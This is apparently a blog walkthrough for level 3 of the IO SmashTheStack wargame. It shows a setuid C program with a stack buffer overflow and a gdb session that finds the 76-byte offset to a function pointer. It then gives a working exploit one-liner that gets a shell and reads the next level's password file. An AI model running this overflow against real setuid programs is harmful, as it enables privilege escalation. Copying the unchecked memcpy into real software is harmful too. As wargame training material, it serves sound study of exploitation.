+++
title = "IO Smash the stack level 03"
date = "2016-01-26T09:33:00-02:00"
publishdate = "2016-01-26"
categories =["Security"]
tags = ["Wargames", "C"]
slug = "io-smashthestack-level-03"
project_url = "https://greyhat.dk/io-smashthestack-level-03"
type = "post"
description = "Walk-through"
image = "binary.png"
image_alt = "Binary pattern"
+++

## Level03

```sh
level3@io:~$ cd /levels/
level3@io:/levels$ ls -latr level03*
-r-------- 1 level3 level3  658 Sep 22  2012 level03.c
-r-sr-x--- 1 level4 level3 5238 Sep 22  2012 level03
```

level3@io:/levels$ cat level03.c
```c
//bla, based on work by beach

#include <stdio.h>
#include <string.h>

void good()
{
        puts("Win.");
        execl("/bin/sh", "sh", NULL);
}
void bad()
{
        printf("I'm so sorry, you're at %p and you want to be at %p\n", bad, good);
}

int main(int argc, char **argv, char **envp)
{
        void (*functionpointer)(void) = bad;
        char buffer[50];

        if(argc != 2 || strlen(argv[1]) < 4)
                return 0;

        memcpy(buffer, argv[1], strlen(argv[1]));
        memset(buffer, 0, strlen(argv[1]) - 4);

        printf("This is exciting we're going to %p\n", functionpointer);
        functionpointer();

        return 0;
}
```

Oki so in order for us to get the shell we need to change the function pointer from `bad` to `good`. Since the program is so nice to provide us with the address of the funtion good

```sh
level3@io:/levels$ ./level03 aaaa
This is exciting we're going to 0x80484a4
I'm so sorry, you're at 0x80484a4 and you want to be at 0x8048474
```

And since we are running in an little endian machine (reverse byte order) we need to reverse the address to \x74\x84\x04\x08 but first we need to find out where to put the address (Sure we could use brute force). But lets have a look at the stack

```sh
level3@io:/levels$ gdb -q level03
Reading symbols from /levels/level03...(no debugging symbols found)...done.
(gdb) r AAAA
Starting program: /levels/level03 AAAA
This is exciting we're going to 0x80484a4
I'm so sorry, you're at 0x80484a4 and you want to be at 0x8048474
[Inferior 1 (process 18072) exited normally]
(gdb) break *0x0804855d <--- break just after the copy
Breakpoint 1 at 0x804855d
(gdb) r AAAA
Starting program: /levels/level03 AAAA

Breakpoint 1, 0x0804855d in main ()
(gdb) x/32x $esp
0xbffffc50:	0xbffffc70	0x00000000	0x00000000	0x00000001
0xbffffc60:	0xb7fff908	0xbffffc96	0xbffffca0	0xb7ef098c
0xbffffc70:	0x41414141	0xb7e9e315	0xbffffc97	0x00000001 <--- 0x41 = A
0xbffffc80:	0x00000000	0x080497c8	0xbffffc98	0x08048338
0xbffffc90:	0xb7ff0590	0x080497c8	0xbffffcc8	0x080485a9
0xbffffca0:	0xb7fcf324	0xb7fceff4	0x08048590	0xbffffcc8
0xbffffcb0:	0xb7e9e515	0xb7ff0590	0x0804859b	0x080484a4 <--- bad pointer (function pointer)
0xbffffcc0:	0x08048590	0x00000000	0xbffffd48	0xb7e85e46
(gdb) print 0xbffffcbc - 0xbffffc70
$1 = 76
```

So lets try to exploit it

```sh
level3@io:/levels$ ./level03 $(python -c 'print "A"*76 + "\x74\x84\x04\x08"')
This is exciting we're going to 0x8048474
Win.
sh-4.2$ cat /home/level4/.pass
XXXXXXXXXXXXXXXX
```

